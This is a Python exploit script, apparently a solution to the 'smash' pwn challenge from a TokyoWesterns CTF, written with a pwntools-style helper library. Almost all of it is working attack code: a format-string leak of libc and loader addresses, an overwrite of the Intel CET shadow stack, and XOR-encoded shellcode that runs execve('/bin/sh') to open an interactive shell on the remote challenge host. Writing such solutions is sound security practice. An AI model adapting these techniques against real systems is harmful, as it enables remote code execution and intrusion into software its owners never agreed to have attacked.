#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './smash'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'PROC', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':'./sde/sde64 -no-follow-child -cet -cet-stderr -cet-call-stack -debug -- {}'.format(bin_file).split()}, \
                        local   = {'argv':['./run.sh']}, \
                        remote  = {'host':'pwn01.chal.ctf.westerns.tokyo', 'port':29246})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = './libc-2.31.so')
env.set_item('ld',      debug   = None, \
                        local   = None, \
                        remote  = './ld-2.31.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

ld = ELF(env.ld if env.ld else '/lib/x86_64-linux-gnu/ld-2.31.so')
offset_ld_rtld_global   = ld.symbols['_rtld_global_ro']
offset_ld2shadow        = -0xada000

#==========

def attack(conn, **kwargs):
    shellasm = '''
    xor rsi, rsi
    xor rdx, rdx
    call rax
    '''
    shellcode = asm(shellasm)

    exploit  = b'%x'*8
    exploit += b'%p%p!'
    exploit += shellcode

    conn.sendafter('name > ', exploit)
    conn.recvuntil('0x')

    addr_libc_main = int(conn.recvuntil('0x', drop=True), 16) - 0xf3
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_execve    = libc.sep_function['execve']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    addr_ld_rtld_global = int(conn.recvuntil('!', drop=True), 16)
    ld.address = addr_ld_rtld_global - offset_ld_rtld_global
    info('addr_ld_base      = 0x{:08x}'.format(ld.address))

    addr_shadow_stack = ld.address + offset_ld2shadow
    info('addr_shadow_stack = 0x{:08x}'.format(addr_shadow_stack))

    exploit  = b'y'*0x30
    exploit += p64(addr_shadow_stack+0xfe8)
    conn.sendafter('[y/n] ', exploit[:-1])

    args = {'str':addr_libc_str_sh^0x0101010101010101, 'execve':addr_libc_execve^0x0101010101010101}
    shellasm = '''
    mov rdi, 0x0101010101010101
    push rdi
    push rdi
    mov rdi, {str}
    xor [rsp], rdi
    pop rdi
    mov rax, {execve}
    xor [rsp], rax
    pop rax
    jmp $-0x45
    '''.format(**args)
    shellcode = asm(shellasm)
    
    exploit  = shellcode.ljust(0x30, b'\x00')
    exploit += p64(addr_shadow_stack+0xfd8)
    conn.sendafter('message > ', exploit[:-1])

    conn.recvuntil('Bye!\n')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
